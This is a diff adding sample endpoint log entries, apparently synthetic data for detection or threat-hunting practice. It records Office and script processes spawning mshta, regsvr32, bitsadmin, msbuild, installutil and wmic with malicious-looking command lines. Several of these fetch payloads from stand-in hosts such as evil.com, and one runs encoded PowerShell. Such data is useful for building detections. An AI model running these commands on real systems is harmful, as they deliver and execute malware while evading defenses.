@@ -1,1 +1,51 @@
+Timestamp: 2026-05-05T10:15:23Z
+DeviceName: DESKTOP-01
+AccountName: user1
+FileName: mshta.exe
+ProcessCommandLine: mshta.exe http://malicious-site/payload.hta
+InitiatingProcessFileName: winword.exe
 
+--------------------------------------------------
+
+Timestamp: 2026-05-05T11:02:10Z
+DeviceName: LAPTOP-22
+AccountName: user2
+FileName: regsvr32.exe
+ProcessCommandLine: regsvr32.exe /s /u /i:http://evil.com/file.sct scrobj.dll
+InitiatingProcessFileName: outlook.exe
+
+--------------------------------------------------
+
+Timestamp: 2026-05-05T11:45:55Z
+DeviceName: WORKSTATION-07
+AccountName: user3
+FileName: msbuild.exe
+ProcessCommandLine: msbuild.exe malicious.xml
+InitiatingProcessFileName: excel.exe
+
+--------------------------------------------------
+
+Timestamp: 2026-05-05T12:20:41Z
+DeviceName: DESKTOP-99
+AccountName: user4
+FileName: bitsadmin.exe
+ProcessCommandLine: bitsadmin /transfer job http://bad-site/file.exe C:\Users\Public\file.exe
+InitiatingProcessFileName: winword.exe
+
+--------------------------------------------------
+
+Timestamp: 2026-05-05T13:05:12Z
+DeviceName: OFFICE-PC-12
+AccountName: user5
+FileName: installutil.exe
+ProcessCommandLine: installutil.exe /U C:\Temp\malicious.dll
+InitiatingProcessFileName: wscript.exe
+
+--------------------------------------------------
+
+Timestamp: 2026-05-05T13:40:33Z
+DeviceName: CORP-LAPTOP-5
+AccountName: user6
+FileName: wmic.exe
+ProcessCommandLine: wmic process call create "powershell -enc aW52b2tlLXdlYnJlcXVlc3Q="
+InitiatingProcessFileName: cscript.exe
